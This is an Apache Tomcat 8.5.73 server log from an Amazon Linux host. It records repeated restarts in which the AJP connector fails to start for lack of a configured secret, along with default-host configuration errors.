14-Jan-2022 06:31:16.507 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/manager]
14-Jan-2022 06:31:16.536 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/manager] has finished in [28] ms
14-Jan-2022 06:31:16.538 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:31:16.557 SEVERE [main] org.apache.catalina.core.StandardService.startInternal Failed to start connector [Connector[AJP/1.3-8009]]
	org.apache.catalina.LifecycleException: Protocol handler start failed
		at org.apache.catalina.connector.Connector.startInternal(Connector.java:1101)
		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
		at org.apache.catalina.core.StandardService.startInternal(StandardService.java:439)
		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
		at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:763)
		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
		at org.apache.catalina.startup.Catalina.start(Catalina.java:688)
		at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
		at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
		at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
		at java.lang.reflect.Method.invoke(Method.java:498)
		at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:345)
		at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:476)
	Caused by: java.lang.IllegalArgumentException: The AJP Connector is configured with secretRequired="true" but the secret attribute is either null or "". This combination is not valid.
		at org.apache.coyote.ajp.AbstractAjpProtocol.start(AbstractAjpProtocol.java:274)
		at org.apache.catalina.connector.Connector.startInternal(Connector.java:1099)
		... 12 more
14-Jan-2022 06:31:16.558 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 736 ms
14-Jan-2022 06:32:56.285 INFO [main] org.apache.catalina.core.StandardServer.await A valid shutdown command was received via the shutdown port. Stopping the Server instance.
14-Jan-2022 06:32:56.286 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:32:56.296 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["ajp-nio-0:0:0:0:0:0:0:1-8009"]
14-Jan-2022 06:32:56.297 INFO [main] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
14-Jan-2022 06:32:56.338 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:32:56.341 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:32:56.342 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["ajp-nio-0:0:0:0:0:0:0:1-8009"]
14-Jan-2022 06:32:56.342 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["ajp-nio-0:0:0:0:0:0:0:1-8009"]
14-Jan-2022 06:32:58.272 WARNING [main] org.apache.catalina.startup.SetAllPropertiesRule.begin [SetAllPropertiesRule]{Server/Service/Connector} Setting property 'address' to '0.0.0.0/0' did not find a matching property.
14-Jan-2022 06:32:58.314 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.73
14-Jan-2022 06:32:58.314 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 11 2021 13:14:36 UTC
14-Jan-2022 06:32:58.314 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.73.0
14-Jan-2022 06:32:58.315 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
14-Jan-2022 06:32:58.315 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.10.82-83.359.amzn2.x86_64
14-Jan-2022 06:32:58.315 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
14-Jan-2022 06:32:58.315 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.312.b07-1.amzn2.0.2.x86_64/jre
14-Jan-2022 06:32:58.315 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_312-b07
14-Jan-2022 06:32:58.315 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Red Hat, Inc.
14-Jan-2022 06:32:58.316 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /usr/local/tomcat
14-Jan-2022 06:32:58.316 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /usr/local/tomcat
14-Jan-2022 06:32:58.316 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties
14-Jan-2022 06:32:58.316 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
14-Jan-2022 06:32:58.317 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
14-Jan-2022 06:32:58.317 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
14-Jan-2022 06:32:58.317 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
14-Jan-2022 06:32:58.317 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
14-Jan-2022 06:32:58.317 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/usr/local/tomcat
14-Jan-2022 06:32:58.318 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/usr/local/tomcat
14-Jan-2022 06:32:58.318 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/usr/local/tomcat/temp
14-Jan-2022 06:32:58.318 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib]
14-Jan-2022 06:32:58.389 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:32:58.403 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
14-Jan-2022 06:32:58.419 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["ajp-nio-127.0.0.1-8009"]
14-Jan-2022 06:32:58.421 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
14-Jan-2022 06:32:58.421 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 780 ms
14-Jan-2022 06:32:58.475 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
14-Jan-2022 06:32:58.476 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/8.5.73]
14-Jan-2022 06:32:58.495 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/ROOT]
14-Jan-2022 06:32:58.790 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/ROOT] has finished in [294] ms
14-Jan-2022 06:32:58.791 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/docs]
14-Jan-2022 06:32:58.807 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/docs] has finished in [17] ms
14-Jan-2022 06:32:58.807 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/examples]
14-Jan-2022 06:32:59.062 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/examples] has finished in [255] ms
14-Jan-2022 06:32:59.063 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/host-manager]
14-Jan-2022 06:32:59.095 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/host-manager] has finished in [32] ms
14-Jan-2022 06:32:59.095 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/manager]
14-Jan-2022 06:32:59.113 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/manager] has finished in [18] ms
14-Jan-2022 06:32:59.119 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:32:59.129 SEVERE [main] org.apache.catalina.core.StandardService.startInternal Failed to start connector [Connector[AJP/1.3-8009]]
	org.apache.catalina.LifecycleException: Protocol handler start failed
		at org.apache.catalina.connector.Connector.startInternal(Connector.java:1101)
		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
		at org.apache.catalina.core.StandardService.startInternal(StandardService.java:439)
		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
		at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:763)
		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
		at org.apache.catalina.startup.Catalina.start(Catalina.java:688)
		at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
		at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
		at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
		at java.lang.reflect.Method.invoke(Method.java:498)
		at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:345)
		at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:476)
	Caused by: java.lang.IllegalArgumentException: The AJP Connector is configured with secretRequired="true" but the secret attribute is either null or "". This combination is not valid.
		at org.apache.coyote.ajp.AbstractAjpProtocol.start(AbstractAjpProtocol.java:274)
		at org.apache.catalina.connector.Connector.startInternal(Connector.java:1099)
		... 12 more
14-Jan-2022 06:32:59.130 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 708 ms
14-Jan-2022 06:37:21.747 INFO [main] org.apache.catalina.core.StandardServer.await A valid shutdown command was received via the shutdown port. Stopping the Server instance.
14-Jan-2022 06:37:21.748 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:37:21.757 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["ajp-nio-127.0.0.1-8009"]
14-Jan-2022 06:37:21.757 INFO [main] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
14-Jan-2022 06:37:21.797 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:37:21.798 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:37:21.799 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["ajp-nio-127.0.0.1-8009"]
14-Jan-2022 06:37:21.799 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["ajp-nio-127.0.0.1-8009"]
14-Jan-2022 06:37:23.993 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.73
14-Jan-2022 06:37:23.996 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 11 2021 13:14:36 UTC
14-Jan-2022 06:37:23.996 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.73.0
14-Jan-2022 06:37:23.996 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
14-Jan-2022 06:37:23.996 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.10.82-83.359.amzn2.x86_64
14-Jan-2022 06:37:23.997 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
14-Jan-2022 06:37:23.997 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.312.b07-1.amzn2.0.2.x86_64/jre
14-Jan-2022 06:37:23.997 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_312-b07
14-Jan-2022 06:37:23.997 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Red Hat, Inc.
14-Jan-2022 06:37:23.998 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /usr/local/tomcat
14-Jan-2022 06:37:23.998 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /usr/local/tomcat
14-Jan-2022 06:37:23.998 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties
14-Jan-2022 06:37:23.998 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
14-Jan-2022 06:37:23.998 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
14-Jan-2022 06:37:23.999 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
14-Jan-2022 06:37:23.999 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
14-Jan-2022 06:37:24.004 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
14-Jan-2022 06:37:24.004 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/usr/local/tomcat
14-Jan-2022 06:37:24.004 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/usr/local/tomcat
14-Jan-2022 06:37:24.004 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/usr/local/tomcat/temp
14-Jan-2022 06:37:24.004 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib]
14-Jan-2022 06:37:24.081 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:37:24.095 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
14-Jan-2022 06:37:24.108 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["ajp-nio-127.0.0.1-8009"]
14-Jan-2022 06:37:24.109 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
14-Jan-2022 06:37:24.110 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 731 ms
14-Jan-2022 06:37:24.142 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
14-Jan-2022 06:37:24.142 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/8.5.73]
14-Jan-2022 06:37:24.153 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/ROOT]
14-Jan-2022 06:37:24.445 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/ROOT] has finished in [292] ms
14-Jan-2022 06:37:24.445 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/docs]
14-Jan-2022 06:37:24.461 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/docs] has finished in [16] ms
14-Jan-2022 06:37:24.462 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/examples]
14-Jan-2022 06:37:24.771 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/examples] has finished in [309] ms
14-Jan-2022 06:37:24.772 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/host-manager]
14-Jan-2022 06:37:24.821 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/host-manager] has finished in [49] ms
14-Jan-2022 06:37:24.822 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/manager]
14-Jan-2022 06:37:24.851 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/manager] has finished in [29] ms
14-Jan-2022 06:37:24.853 SEVERE [main] org.apache.catalina.mapper.MapperListener.findDefaultHost Unknown default host [0.0.0.0] for service [StandardService[Catalina]]. Tomcat will not be able process HTTP/1.0 requests that do not specify a host name.
14-Jan-2022 06:37:24.855 SEVERE [main] org.apache.catalina.mapper.MapperListener.findDefaultHost Unknown default host [0.0.0.0] for service [StandardService[Catalina]]. Tomcat will not be able process HTTP/1.0 requests that do not specify a host name.
14-Jan-2022 06:37:24.855 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:37:24.868 SEVERE [main] org.apache.catalina.core.StandardService.startInternal Failed to start connector [Connector[AJP/1.3-8009]]
	org.apache.catalina.LifecycleException: Protocol handler start failed
		at org.apache.catalina.connector.Connector.startInternal(Connector.java:1101)
		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
		at org.apache.catalina.core.StandardService.startInternal(StandardService.java:439)
		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
		at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:763)
		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
		at org.apache.catalina.startup.Catalina.start(Catalina.java:688)
		at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
		at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
		at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
		at java.lang.reflect.Method.invoke(Method.java:498)
		at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:345)
		at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:476)
	Caused by: java.lang.IllegalArgumentException: The AJP Connector is configured with secretRequired="true" but the secret attribute is either null or "". This combination is not valid.
		at org.apache.coyote.ajp.AbstractAjpProtocol.start(AbstractAjpProtocol.java:274)
		at org.apache.catalina.connector.Connector.startInternal(Connector.java:1099)
		... 12 more
14-Jan-2022 06:37:24.870 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 760 ms
14-Jan-2022 06:41:11.299 INFO [main] org.apache.catalina.core.StandardServer.await A valid shutdown command was received via the shutdown port. Stopping the Server instance.
14-Jan-2022 06:41:11.299 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:41:11.304 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["ajp-nio-127.0.0.1-8009"]
14-Jan-2022 06:41:11.305 INFO [main] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
14-Jan-2022 06:41:11.307 SEVERE [Catalina-startStop-2] org.apache.catalina.mapper.MapperListener.findDefaultHost Unknown default host [0.0.0.0] for service [StandardService[Catalina]]. Tomcat will not be able process HTTP/1.0 requests that do not specify a host name.
14-Jan-2022 06:41:11.342 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:41:11.344 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:41:11.345 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["ajp-nio-127.0.0.1-8009"]
14-Jan-2022 06:41:11.345 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["ajp-nio-127.0.0.1-8009"]
14-Jan-2022 06:41:15.985 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.73
14-Jan-2022 06:41:15.988 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 11 2021 13:14:36 UTC
14-Jan-2022 06:41:15.989 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.73.0
14-Jan-2022 06:41:15.989 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
14-Jan-2022 06:41:15.989 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.10.82-83.359.amzn2.x86_64
14-Jan-2022 06:41:15.989 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
14-Jan-2022 06:41:15.990 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.312.b07-1.amzn2.0.2.x86_64/jre
14-Jan-2022 06:41:15.990 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_312-b07
14-Jan-2022 06:41:15.990 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Red Hat, Inc.
14-Jan-2022 06:41:15.990 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /usr/local/tomcat
14-Jan-2022 06:41:15.990 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /usr/local/tomcat
14-Jan-2022 06:41:15.991 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties
14-Jan-2022 06:41:15.991 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
14-Jan-2022 06:41:15.991 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
14-Jan-2022 06:41:15.991 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
14-Jan-2022 06:41:15.992 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
14-Jan-2022 06:41:15.997 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
14-Jan-2022 06:41:15.997 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/usr/local/tomcat
14-Jan-2022 06:41:15.997 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/usr/local/tomcat
14-Jan-2022 06:41:15.997 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/usr/local/tomcat/temp
14-Jan-2022 06:41:15.997 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib]
14-Jan-2022 06:41:16.080 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:41:16.094 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
14-Jan-2022 06:41:16.109 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["ajp-nio-127.0.0.1-8009"]
14-Jan-2022 06:41:16.111 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
14-Jan-2022 06:41:16.111 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 807 ms
14-Jan-2022 06:41:16.144 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
14-Jan-2022 06:41:16.145 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/8.5.73]
14-Jan-2022 06:41:16.154 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/ROOT]
14-Jan-2022 06:41:16.408 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/ROOT] has finished in [254] ms
14-Jan-2022 06:41:16.408 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/docs]
14-Jan-2022 06:41:16.425 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/docs] has finished in [16] ms
14-Jan-2022 06:41:16.425 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/examples]
14-Jan-2022 06:41:16.685 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/examples] has finished in [260] ms
14-Jan-2022 06:41:16.686 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/host-manager]
14-Jan-2022 06:41:16.717 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/host-manager] has finished in [31] ms
14-Jan-2022 06:41:16.718 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/manager]
14-Jan-2022 06:41:16.735 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/manager] has finished in [17] ms
14-Jan-2022 06:41:16.737 SEVERE [main] org.apache.catalina.mapper.MapperListener.findDefaultHost Unknown default host [0.0.0.0] for service [StandardService[Catalina]]. Tomcat will not be able process HTTP/1.0 requests that do not specify a host name.
14-Jan-2022 06:41:16.739 SEVERE [main] org.apache.catalina.mapper.MapperListener.findDefaultHost Unknown default host [0.0.0.0] for service [StandardService[Catalina]]. Tomcat will not be able process HTTP/1.0 requests that do not specify a host name.
14-Jan-2022 06:41:16.739 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:41:16.765 SEVERE [main] org.apache.catalina.core.StandardService.startInternal Failed to start connector [Connector[AJP/1.3-8009]]
	org.apache.catalina.LifecycleException: Protocol handler start failed
		at org.apache.catalina.connector.Connector.startInternal(Connector.java:1101)
		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
		at org.apache.catalina.core.StandardService.startInternal(StandardService.java:439)
		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
		at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:763)
		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
		at org.apache.catalina.startup.Catalina.start(Catalina.java:688)
		at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
		at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
		at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
		at java.lang.reflect.Method.invoke(Method.java:498)
		at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:345)
		at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:476)
	Caused by: java.lang.IllegalArgumentException: The AJP Connector is configured with secretRequired="true" but the secret attribute is either null or "". This combination is not valid.
		at org.apache.coyote.ajp.AbstractAjpProtocol.start(AbstractAjpProtocol.java:274)
		at org.apache.catalina.connector.Connector.startInternal(Connector.java:1099)
		... 12 more
14-Jan-2022 06:41:16.766 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 654 ms
14-Jan-2022 06:56:35.440 INFO [main] org.apache.catalina.core.StandardServer.await A valid shutdown command was received via the shutdown port. Stopping the Server instance.
14-Jan-2022 06:56:35.440 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:56:35.444 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["ajp-nio-127.0.0.1-8009"]
14-Jan-2022 06:56:35.444 INFO [main] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
